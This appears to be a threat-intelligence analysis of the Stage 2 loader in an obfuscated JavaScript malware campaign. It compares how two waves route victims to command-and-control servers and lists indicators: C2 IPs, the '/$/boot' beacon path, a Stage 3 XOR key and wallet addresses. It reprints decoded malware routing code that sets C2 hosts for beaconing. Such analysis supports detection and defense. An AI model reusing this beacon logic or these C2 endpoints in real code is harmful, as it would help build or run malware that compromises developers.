# Task R: `_$_f5f0` Stage 2 Decode — Victim Pool Pruning

**Date:** 2026-06-28  
**Source:** Jun 25 2026 W2 Stage 1 (`_$_f5f0` / `cdi`) → Stage 2 body  
**Stage 2 size:** 1,867 chars (vs Jun 20's 1,958 chars — 91 chars shorter)  
**Cipher:** `_$_d6e0` (seed=565583, 33-entry table)

---

## Summary

The Jun 25 Stage 2 reveals the actor **pruning their victim pool**. Two C2 IPs have been
removed, and the routing logic now silently drops all victims except those with a pure numeric
campaign ID format. Old `_$_1e42` batch victims (`'A...'` prefix) and new-wave mixed-format
victims (`'5-3-161'`) are both abandoned — no beacon, no C2 contact.

Only numeric campaign IDs (a format not yet seen in any infected repo) remain active against
a single remaining production server: `198.105.127.210`.

---

## Routing Logic Comparison

### Jun 20 Stage 2 (`_$_a478`, 35 entries)

```javascript
var r = global['_V'] || 0;

if (r[0] == 'A') {
    global['_H2'] = 'http://23.27.13.43';       // old _$_1e42 batch victims
} else if (!isNaN(parseInt(r))) {
    global['_H2'] = 'http://198.105.127.210';    // numeric victims → production
} else {
    global['_H']  = 'http://198.105.127.210';    // mixed victims → production
    global['_H2'] = 'http://23.27.202.27:27017'; // MongoDB fallback
}
// → beacon GET to (_H || _H2) + '/$/boot'
```

### Jun 25 Stage 2 (`_$_d6e0`, 33 entries)

```javascript
var a = global['_V'] || 0;

if (a[0] == 'A') {
    return;                                       // 'A...' victims → ABANDONED
} else {
    if (!isNaN(parseInt(a))) {
        global['_H2'] = 'http://198.105.127.210'; // numeric → production
    } else {
        return;                                   // mixed '5-3-161' → ABANDONED
    }
}
// global['_H'] never set in this version
// → beacon GET to (_H || _H2) + '/$/boot'  =  198.105.127.210/$/boot
```

---

## Removed IPs

| IP | Role in Jun 20 | Status in Jun 25 |
|----|---------------|-----------------|
| `23.27.13.43` | Old `_$_1e42` victim handler (`'A...'` prefix) | **REMOVED** |
| `23.27.202.27:27017` | MongoDB backend / `'5-3-...'` fallback | **REMOVED** |
| `198.105.127.210` | Production server (numeric victims) | Still present |

Both removed IPs had their routing branch replaced with `return` (silent drop).
`23.27.13.43` is now unreachable from ANY Stage 2 path.

---

## Victim Fate by Campaign ID Format

| `_V` format | Example | Jun 20 outcome | Jun 25 outcome |
|------------|---------|----------------|----------------|
| Starts with `'A'` | `'A8-765'` | Beacon → `23.27.13.43` | **Silent drop** |
| Mixed `N-N-NNN` | `'5-3-161'` | Beacon → `198.105.127.210` | **Silent drop** |
| Pure numeric | (unknown) | Beacon → `198.105.127.210` | Beacon → `198.105.127.210` |

The actor has abandoned the two largest known victim cohorts. Only the unknown numeric
format remains active. This likely signals a transition to a new campaign wave with a
different ID scheme, leaving old victims behind rather than attempting cleanup.

---

## `_$_d6e0` String Table — Full Decode

33 entries (vs 35 in Jun 20):

```
[0]:  '_V'                                        ← campaign ID key
[1]:  'A'                                         ← prefix test (exit condition)
[2]:  'parseInt'
[3]:  'isNaN'
[4]:  '_H2'                                       ← C2 host global
[5]:  'http://198.105.127.210'                    ← sole remaining C2 IP
[6]:  '_t_1'
[7]:  'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP'       ← TRON W1 (stored, same as before)
[8]:  '_t_2'
[9]:  '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e'  ← Aptos 1
[10]: '_H'                                        ← primary host (never set in this version)
[11]: '/$/boot'                                   ← beacon path
[12]: 'URL'
[13]: 'GET'
[14]: 'hostname'
[15]: 'port'
[16]: 'pathname'
[17]: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36'
[18]: ''
[19]: 'data'
[20]: 'on'
[21]: 'end'
[22]: 'request'
[23]: 'http'
[24]: 'r'
[25]: 'error'
[26]: 'Promise'
[27]: 'ThZG+0jfXE6VAGOJ'                         ← Stage 3 XOR key (unchanged)
[28]: 'length'
[29]: 'call'
[30]: 'charCodeAt'
[31]: 'fromCharCode'
[32]: 'String'
```

---

## `global['m']` — Not Used in Stage 2

Stage 1 (`_$_f5f0`) now captures `global['m'] = module`. Stage 2 makes no reference to
`global['m']` in its current implementation. The module object is stored but not accessed
here — it is likely reserved for Stage 3 consumption, or represents infrastructure staged
for a future payload capability.

---

## Unchanged Elements

- **Beacon endpoint**: `http://198.105.127.210/$/boot`
- **HTTP method / headers**: `GET`, `User-Agent: Mozilla/5.0 ...Chrome/131...`, `Sec-V: <campaign_id>`
- **Stage 3 XOR key**: `ThZG+0jfXE6VAGOJ`
- **TRON W1 wallet stored**: `global['_t_1'] = 'TMfKQEd7...'`
- **Aptos 1 stored**: `global['_t_2'] = '0xbe037400...'`
- **XOR loop structure** for decrypting Stage 3 HTTP response

---

## New IOCs

```
# New Stage 2 cipher
_$_d6e0
Seed: 565583 | off1: 182 | mod1: 46518 | off2: 113 | mod2: 28941 | Modulus: 7580985

# IPs REMOVED from active routing (no longer receive beacons)
23.27.13.43           ← was: 'A...' prefix victims; now: unreachable
23.27.202.27:27017    ← was: MongoDB backend; now: unreachable

# Sole active C2 endpoint (Jun 25+)
http://198.105.127.210/$/boot   (numeric campaign IDs only)
```

---

## Activation / Return Codes

| Wave | Activation | Return |
|------|-----------|--------|
| Jun 20 (`_$_16d1` / `_$_a478`) | 8063 | 8223 |
| Jun 25 (`_$_f5f0`/`cdi` / `_$_d6e0`) | **1218** | **2021** |
